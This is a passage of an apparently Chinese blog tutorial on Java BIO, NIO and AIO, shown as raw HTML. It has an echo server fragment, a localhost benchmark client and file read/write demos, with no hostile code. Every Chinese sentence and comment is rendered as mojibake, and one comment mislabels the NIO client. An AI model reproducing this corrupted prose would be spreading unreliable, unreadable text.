class="variable">buffer</span> <span class="operator">=</span> ByteBuffer.allocate(<span class="number">1024</span>);</span><br><span class="line">                        <span class="comment">// ä» SocketChannel ä¸­è¯»å–å¹¶å†™å…¥ ByteBuffer</span></span><br><span class="line">                        client.read(buffer);</span><br><span class="line">                        <span class="comment">// ç¿»è½¬ByteBufferï¼Œå‡†å¤‡è¯»å–</span></span><br><span class="line">                        buffer.flip();</span><br><span class="line">                        <span class="comment">// å°†æ•°æ®ä»ByteBufferå†™å›åˆ° SocketChannel</span></span><br><span class="line">                        client.write(buffer);</span><br><span class="line">                        <span class="comment">// å…³é—­è¿æ¥</span></span><br><span class="line">                        client.close();</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¸Šé¢çš„ä»£ç åˆ›å»ºäº†ä¸€ä¸ªåŸºäº Java NIO çš„ç®€å• TCP æœåŠ¡å™¨ã€‚å®ƒä½¿ç”¨ ServerSocketChannel å’Œ Selectorï¼ˆåé¢ä¼šè®²ï¼‰ å®ç°äº†éé˜»å¡ I&#x2F;O å’Œ I&#x2F;O å¤šè·¯å¤ç”¨ã€‚æœåŠ¡å™¨å¾ªç¯ç›‘å¬äº‹ä»¶ï¼Œå½“æœ‰æ–°çš„è¿æ¥è¯·æ±‚æ—¶ï¼Œæ¥å—è¿æ¥å¹¶å°†æ–°çš„ SocketChannel æ³¨å†Œåˆ° Selectorï¼Œå…³æ³¨ OP_READ äº‹ä»¶ã€‚å½“æœ‰æ•°æ®å¯è¯»æ—¶ï¼Œä» SocketChannel ä¸­è¯»å–æ•°æ®å¹¶å†™å…¥ ByteBufferï¼Œç„¶åå°†æ•°æ®ä» ByteBuffer å†™å›åˆ° SocketChannelã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestClient</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> InterruptedException&#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">clientCount</span> <span class="operator">=</span> <span class="number">1000</span>;</span><br><span class="line">        <span class="type">ExecutorService</span> <span class="variable">executorServiceIO</span> <span class="operator">=</span> Executors.newFixedThreadPool(<span class="number">10</span>);</span><br><span class="line">        <span class="type">ExecutorService</span> <span class="variable">executorServiceNIO</span> <span class="operator">=</span> Executors.newFixedThreadPool(<span class="number">10</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// ä½¿ç”¨ä¼ ç»ŸIOçš„å®¢æˆ·ç«¯</span></span><br><span class="line">        <span class="type">Runnable</span> <span class="variable">ioClient</span> <span class="operator">=</span> () -&gt; &#123;</span><br><span class="line">            <span class="keyword">try</span>&#123;</span><br><span class="line">                <span class="type">Socket</span> <span class="variable">socket</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Socket</span>(<span class="string">&quot;localhost&quot;</span>, <span class="number">8080</span>);</span><br><span class="line">                <span class="type">OutputStream</span> <span class="variable">out</span> <span class="operator">=</span> socket.getOutputStream();</span><br><span class="line">                <span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> socket.getInputStream();</span><br><span class="line">                out.write(<span class="string">&quot;hello ä½ å¥½å•Š&quot;</span>.getBytes());</span><br><span class="line">                <span class="type">byte</span>[] buffer = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">1024</span>];</span><br><span class="line">                in.read(buffer);</span><br><span class="line">                in.close();</span><br><span class="line">                out.close();</span><br><span class="line">                socket.close();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// ä½¿ç”¨ä¼ ç»ŸIOçš„å®¢æˆ·ç«¯</span></span><br><span class="line">        <span class="type">Runnable</span> <span class="variable">nioClient</span> <span class="operator">=</span> () -&gt; &#123;</span><br><span class="line">            <span class="keyword">try</span>&#123;</span><br><span class="line">                <span class="type">SocketChannel</span> <span class="variable">socketChannel</span> <span class="operator">=</span> SocketChannel.open();</span><br><span class="line">                socketChannel.connect(<span class="keyword">new</span> <span class="title class_">InetSocketAddress</span>(<span class="string">&quot;localhost&quot;</span>, <span class="number">8081</span>));</span><br><span class="line">                <span class="type">ByteBuffer</span> <span class="variable">buffer</span> <span class="operator">=</span> ByteBuffer.wrap(<span class="string">&quot;ä½ å¥½å•Š è¿™ä¸ªæ˜¯nio&quot;</span>.getBytes());</span><br><span class="line">                socketChannel.write(buffer);</span><br><span class="line">                buffer.clear();</span><br><span class="line">                socketChannel.read(buffer);</span><br><span class="line">                socketChannel.close();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// åˆ†åˆ«æµ‹è¯•æ€§èƒ½</span></span><br><span class="line">        <span class="type">long</span> startTime, endTime;</span><br><span class="line"></span><br><span class="line">        startTime = System.currentTimeMillis();</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; clientCount; i++)&#123;</span><br><span class="line">            executorServiceIO.execute(ioClient);</span><br><span class="line">        &#125;</span><br><span class="line">        executorServiceIO.shutdown();</span><br><span class="line">        executorServiceIO.awaitTermination(<span class="number">1</span>, TimeUnit.MINUTES);</span><br><span class="line">        endTime = System.currentTimeMillis();</span><br><span class="line">        System.out.println(<span class="string">&quot;ä¼ ç»ŸIOæœåŠ¡å™¨å¤„ç†&quot;</span> + clientCount + <span class="string">&quot;ä¸ªå®¢æˆ·ç«¯è€—æ—¶&quot;</span> + (endTime - startTime) + <span class="string">&quot;ms&quot;</span>);</span><br><span class="line"></span><br><span class="line">        startTime = System.currentTimeMillis();</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; clientCount; i++)&#123;</span><br><span class="line">            executorServiceNIO.execute(nioClient);</span><br><span class="line">        &#125;</span><br><span class="line">        executorServiceNIO.shutdown();</span><br><span class="line">        executorServiceNIO.awaitTermination(<span class="number">1</span>, TimeUnit.MINUTES);</span><br><span class="line">        endTime = System.currentTimeMillis();</span><br><span class="line">        System.out.println(<span class="string">&quot;NIOæœåŠ¡å™¨å¤„ç†&quot;</span> + clientCount + <span class="string">&quot;ä¸ªå®¢æˆ·ç«¯è€—æ—¶&quot;</span> + (endTime - startTime) + <span class="string">&quot;ms&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2024/11/04/code/javanio/image-2.png" alt="å¯ä»¥çœ‹å‡ºNIOå¿«äº†ä¸€äº›"></p><h2 id="NIOã€BIOå’ŒAIOçš„åŒºåˆ«"><a href="#NIOã€BIOå’ŒAIOçš„åŒºåˆ«" class="headerlink" title="NIOã€BIOå’ŒAIOçš„åŒºåˆ«"></a>NIOã€BIOå’ŒAIOçš„åŒºåˆ«</h2><p>NIO ä¸åŸæ¥çš„ I&#x2F;O æœ‰åŒæ ·çš„ä½œç”¨å’Œç›®çš„, ä»–ä»¬ä¹‹é—´æœ€é‡è¦çš„åŒºåˆ«æ˜¯æ•°æ®æ‰“åŒ…å’Œä¼ è¾“çš„æ–¹å¼ã€‚åŸæ¥çš„ I&#x2F;O ä»¥æµçš„æ–¹å¼å¤„ç†æ•°æ®ï¼Œè€Œ NIO ä»¥å—çš„æ–¹å¼å¤„ç†æ•°æ®ã€‚<br>é¢å‘æµçš„ I&#x2F;O ç³»ç»Ÿä¸€æ¬¡ä¸€ä¸ªå­—èŠ‚åœ°å¤„ç†æ•°æ®ã€‚ä¸€ä¸ªè¾“å…¥æµäº§ç”Ÿä¸€ä¸ªå­—èŠ‚çš„æ•°æ®ï¼Œä¸€ä¸ªè¾“å‡ºæµæ¶ˆè´¹ä¸€ä¸ªå­—èŠ‚çš„æ•°æ®ã€‚<br>é¢å‘å—çš„ I&#x2F;O ç³»ç»Ÿä»¥å—çš„å½¢å¼å¤„ç†æ•°æ®ã€‚æ¯ä¸€ä¸ªæ“ä½œéƒ½åœ¨ä¸€æ­¥ä¸­äº§ç”Ÿæˆ–è€…æ¶ˆè´¹ä¸€ä¸ªæ•°æ®å—ã€‚æŒ‰å—å¤„ç†æ•°æ®æ¯”æŒ‰(æµå¼çš„)å­—èŠ‚å¤„ç†æ•°æ®è¦å¿«å¾—å¤šã€‚ä½†æ˜¯é¢å‘å—çš„ I&#x2F;O ç¼ºå°‘ä¸€äº›é¢å‘æµçš„ I&#x2F;O æ‰€å…·æœ‰çš„ä¼˜é›…æ€§å’Œç®€å•æ€§ã€‚</p><p>Java AIOï¼Œå…¨ç§° Asynchronous IOï¼Œæ˜¯å¼‚æ­¥éé˜»å¡çš„ IOã€‚æ˜¯ä¸€ç§éé˜»å¡å¼‚æ­¥çš„é€šä¿¡æ¨¡å¼ã€‚<br>åœ¨ NIO çš„åŸºç¡€ä¸Šå¼•å…¥äº†æ–°çš„å¼‚æ­¥é€šé“çš„æ¦‚å¿µï¼Œå¹¶æä¾›äº†å¼‚æ­¥æ–‡ä»¶é€šé“å’Œå¼‚æ­¥å¥—æ¥å­—é€šé“çš„å®ç°ã€‚</p><p>BIO ï¼ˆBlocking I&#x2F;Oï¼‰ï¼šåŒæ­¥é˜»å¡ I&#x2F;O æ¨¡å¼ã€‚è¿™ç§æ¨¡å¼ä¸‹ï¼Œæˆ‘ä»¬çš„å·¥ä½œæ¨¡å¼æ˜¯å…ˆæ¥åˆ°å¨æˆ¿ï¼Œå¼€å§‹çƒ§æ°´ï¼Œå¹¶ååœ¨æ°´å£¶é¢å‰ä¸€ç›´ç­‰ç€æ°´çƒ§å¼€ã€‚<br>NIO ï¼ˆNew I&#x2F;Oï¼‰ï¼šåŒæ­¥éé˜»å¡æ¨¡å¼ã€‚è¿™ç§æ¨¡å¼ä¸‹ï¼Œæˆ‘ä»¬çš„å·¥ä½œæ¨¡å¼æ˜¯å…ˆæ¥åˆ°å¨æˆ¿ï¼Œå¼€å§‹çƒ§æ°´ï¼Œä½†æ˜¯æˆ‘ä»¬ä¸ä¸€ç›´ååœ¨æ°´å£¶å‰é¢ç­‰ï¼Œè€Œæ˜¯å›åˆ°å®¢å…çœ‹ç”µè§†ï¼Œç„¶åæ¯éš”å‡ åˆ†é’Ÿåˆ°å¨æˆ¿çœ‹ä¸€ä¸‹æ°´æœ‰æ²¡æœ‰çƒ§å¼€ã€‚<br>AIO ï¼ˆAsynchronous I&#x2F;Oï¼‰ï¼šå¼‚æ­¥éé˜»å¡ I&#x2F;O æ¨¡å‹ã€‚è¿™ç§æ¨¡å¼ä¸‹ï¼Œæˆ‘ä»¬çš„å·¥ä½œæ¨¡å¼æ˜¯å…ˆæ¥åˆ°å¨æˆ¿ï¼Œå¼€å§‹çƒ§æ°´ï¼Œæˆ‘ä»¬ä¸ä¸€ç›´ååœ¨æ°´å£¶å‰é¢ç­‰ï¼Œä¹Ÿä¸éš”ä¸€æ®µæ—¶é—´å»çœ‹ä¸€ä¸‹ï¼Œè€Œæ˜¯åœ¨å®¢å…çœ‹ç”µè§†ï¼Œæ°´å£¶ä¸Šé¢æœ‰ä¸ªå¼€å…³ï¼Œæ°´çƒ§å¼€ä¹‹åä»–ä¼šé€šçŸ¥æˆ‘ã€‚</p><p>é˜»å¡ VS éé˜»å¡ï¼šäººæ˜¯å¦ååœ¨æ°´å£¶å‰é¢ä¸€ç›´ç­‰ã€‚<br>åŒæ­¥ VS å¼‚æ­¥ï¼šæ°´å£¶æ˜¯ä¸æ˜¯åœ¨æ°´çƒ§å¼€ä¹‹åä¸»åŠ¨é€šçŸ¥äººã€‚</p><p>BIO æ–¹å¼é€‚ç”¨äºè¿æ¥æ•°ç›®æ¯”è¾ƒå°ä¸”å›ºå®šçš„æ¶æ„<br>NIO æ–¹å¼é€‚ç”¨äºè¿æ¥æ•°ç›®å¤šä¸”è¿æ¥æ¯”è¾ƒçŸ­ï¼ˆè½»æ“ä½œï¼‰çš„æ¶æ„ï¼Œæ¯”å¦‚èŠå¤©æœåŠ¡å™¨ï¼Œå¹¶å‘å±€é™äºåº”ç”¨ä¸­ï¼Œç¼–ç¨‹æ¯”è¾ƒå¤æ‚<br>AIO æ–¹å¼é€‚ç”¨äºè¿æ¥æ•°ç›®å¤šä¸”è¿æ¥æ¯”è¾ƒé•¿ï¼ˆé‡æ“ä½œï¼‰çš„æ¶æ„ï¼Œæ¯”å¦‚ç›¸å†ŒæœåŠ¡å™¨ï¼Œå……åˆ†è°ƒç”¨ OS å‚ä¸å¹¶å‘æ“ä½œ</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">BioFileDemo</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">        <span class="type">BioFileDemo</span> <span class="variable">demo</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BioFileDemo</span>();</span><br><span class="line">        demo.writeFile();</span><br><span class="line">        demo.readFile();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">writeFile</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">filename</span> <span class="operator">=</span> <span class="string">&quot;logs/itdas/dasda.txt&quot;</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">FileWriter</span> <span class="variable">fileWriter</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileWriter</span>(filename);</span><br><span class="line">            <span class="type">BufferedWriter</span> <span class="variable">bufferedWriter</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedWriter</span>(fileWriter);</span><br><span class="line"></span><br><span class="line">            bufferedWriter.write(<span class="string">&quot;dasdasdasdasd&quot;</span>);</span><br><span class="line">            bufferedWriter.newLine();</span><br><span class="line"></span><br><span class="line">            System.out.println(<span class="string">&quot;å†™å…¥å®Œæˆ&quot;</span>);</span><br><span class="line">            bufferedWriter.close();</span><br><span class="line">            fileWriter.close();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">readFile</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">filename</span> <span class="operator">=</span> <span class="string">&quot;logs/itdas/dasda.txt&quot;</span>;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="type">FileReader</span> <span class="variable">fileReader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileReader</span>(filename);</span><br><span class="line">            <span class="type">BufferedReader</span> <span class="variable">bufferedReader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(fileReader);</span><br><span class="line"></span><br><span class="line">            String line;</span><br><span class="line">            <span class="keyword">while</span>((line = bufferedReader.readLine()) != <span class="literal">null</span>)&#123;</span><br><span class="line">                System.out.println(line);</span><br><span class="line">            &#125;</span><br><span class="line">            bufferedReader.close();</span><br><span class="line">            fileReader.close();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (FileNotFoundException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªç¤ºä¾‹å±•ç¤ºäº†å¦‚ä½•ä½¿ç”¨ Java ä¸­çš„ä¼ ç»Ÿé˜»å¡ I&#x2F;Oï¼ˆBIOï¼‰å¯¹æ–‡ä»¶è¿›è¡Œè¯»å†™æ“ä½œã€‚åœ¨ writeFile() æ–¹æ³•ä¸­ï¼Œæˆ‘ä»¬é¦–å…ˆåˆ›å»ºä¸€ä¸ª FileWriter å¯¹è±¡ï¼Œå¹¶ä½¿ç”¨ BufferedWriter è¿›è¡Œç¼“å†²å†™å…¥ã€‚æ¥ç€ï¼Œä½¿ç”¨ bufferedWriter.write() æ–¹æ³•å°†å­—ç¬¦ä¸²å†™å…¥æ–‡ä»¶ï¼Œç„¶åè°ƒç”¨ bufferedWriter.newLine() æ–¹æ³•æ·»åŠ æ¢è¡Œç¬¦ã€‚æœ€åï¼Œå…³é—­ BufferedWriter å’Œ FileWriterã€‚åœ¨ readFile() æ–¹æ³•ä¸­ï¼Œæˆ‘ä»¬åˆ›å»ºä¸€ä¸ª FileReader å¯¹è±¡ï¼Œå¹¶ä½¿ç”¨ BufferedReader è¿›è¡Œç¼“å†²è¯»å–ã€‚ç„¶åé€šè¿‡è°ƒç”¨ bufferedReader.readLine() æ–¹æ³•å¾ªç¯è¯»å–æ–‡ä»¶å†…å®¹ï¼Œç›´åˆ°è¿”å› null è¡¨ç¤ºè¯»å–å®Œæ¯•ã€‚æœ€åï¼Œå…³é—­ BufferedReader å’Œ FileReaderã€‚</p><p>æ¥ä¸‹æ¥æ˜¯ NIO çš„ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">NioFileDemo</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">NioFileDemo</span> <span class="variable">demo</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">NioFileDemo</span>();</span><br><span class="line">        demo.writeFile();</span><br><span class="line">        demo.readFile();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ä½¿ç”¨ NIO å†™å…¥æ–‡ä»¶</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">writeFile</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">Path</span> <span class="variable">path</span> <span class="operator">=</span> Paths.get(<span class="string">&quot;logs/itwanger/paicoding.txt&quot;</span>);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">FileChannel</span> <span class="variable">fileChannel</span> <span class="operator">=</span> FileChannel.open(path, EnumSet.of(StandardOpenOption.CREATE, StandardOpenOption.WRITE));</span><br><span class="line"></span><br><span class="line">            <span class="type">ByteBuffer</span> <span class="variable">buffer</span> <span class="operator">=</span> StandardCharsets.UTF_8.encode(<span class="string">&quot;å­¦ç¼–ç¨‹å°±ä¸ŠæŠ€æœ¯æ´¾&quot;</span>);</span><br><span class="line">            fileChannel.write(buffer);</span><br><span class="line"></span><br><span class="line">            System.out.println(<span class="string">&quot;å†™å…¥å®Œæˆ&quot;</span>);</span><br><span class="line">            fileChannel.close();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ä½¿ç”¨ NIO è¯»å–æ–‡ä»¶</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">readFile</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">Path</span> <span class="variable">path</span> <span class="operator">=</span> Paths.get(<span class="string">&quot;logs/itwanger/paicoding.txt&quot;</span>);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">FileChannel</span> <span class="variable">fileChannel</span> <span class="operator">=</span> FileChannel.open(path, StandardOpenOption.READ);</span><br><span class="line">            <span class="type">ByteBuffer</span> <span class="variable">buffer</span> <span class="operator">=</span> ByteBuffer.allocate(<span class="number">1024</span>);</span><br><span class="line"></span><br><span class="line">            <span class="type">int</span> <span class="variable">bytesRead</span> <span class="operator">=</span> fileChannel.read(buffer);</span><br><span class="line">            <span class="keyword">while</span> (bytesRead != -<span class="number">1</span>) &#123;</span><br><span class="line">                buffer.flip();</span><br><span class="line">                System.out.println(<span class="string">&quot;è¯»å–çš„å†…å®¹: &quot;</span> + StandardCharsets.UTF_8.decode(buffer));</span><br><span class="line">                buffer.clear();</span><br><span class="line">                bytesRead = fileChannel.read(buffer);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            fileChannel.close();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨ AIO å®ç°æ–‡ä»¶çš„è¯»å–å’Œå†™å…¥</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">AioDemo</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">AioDemo</span> <span class="variable">demo</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">AioDemo</span>();</span><br><span class="line">        demo.writeFile();</span><br><span class="line">        demo.readFile();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ä½¿ç”¨ AsynchronousFileChannel å†™å…¥æ–‡ä»¶</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">writeFile</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="comment">// ä½¿ç”¨ Paths.get() è·å–æ–‡ä»¶è·¯å¾„</span></span><br><span class="line">        <span class="type">Path</span> <span class="variable">path</span> <span class="operator">=</span> Paths.get(<span class="string">&quot;logs/itwanger/paicoding.txt&quot;</span>);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// ç”¨ AsynchronousFileChannel.open() æ‰“å¼€æ–‡ä»¶é€šé“ï¼ŒæŒ‡å®šå†™å…¥å’Œåˆ›å»ºæ–‡ä»¶çš„é€‰é¡¹ã€‚</span></span><br><span class="line">            <span class="type">AsynchronousFileChannel</span> <span class="variable">fileChannel</span> <span class="operator">=</span> AsynchronousFileChannel.open(path, StandardOpenOption.WRITE, StandardOpenOption.CREATE);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// å°†è¦å†™å…¥çš„å­—ç¬¦ä¸²ï¼ˆ&quot;å­¦ç¼–ç¨‹å°±ä¸ŠæŠ€æœ¯æ´¾&quot;ï¼‰è½¬æ¢ä¸º ByteBufferã€‚</span></span><br><span class="line">            <span class="type">ByteBuffer</span> <span class="variable">buffer</span> <span class="operator">=</span> StandardCharsets.UTF_8.encode(<span class="string">&quot;å­¦ç¼–ç¨‹å°±ä¸ŠæŠ€æœ¯æ´¾&quot;</span>);</span><br><span class="line">            <span class="comment">// è°ƒç”¨ fileChannel.write() æ–¹æ³•å°† ByteBuffer ä¸­çš„å†…å®¹å†™å…¥æ–‡ä»¶ã€‚è¿™æ˜¯ä¸€ä¸ªå¼‚æ­¥æ“ä½œï¼Œå› æ­¤éœ€è¦ä½¿ç”¨ Future å¯¹è±¡ç­‰å¾…å†™å…¥æ“ä½œå®Œæˆã€‚</span></span><br><span class="line">            Future&lt;Integer&gt; result = fileChannel.write(buffer, <span class="number">0</span>);</span><br><span class="line">            <span class="comment">// ç­‰å¾…å†™æ“ä½œå®Œæˆ</span></span><br><span class="line">            result.get();</span><br><span class="line"></span><br><span class="line">            System.out.println(<span class="string">&quot;å†™å…¥å®Œæˆ&quot;</span>);</span><br><span class="line">            fileChannel.close();</span><br><span class="line">        &#125; <span class="keyword">catch</span> 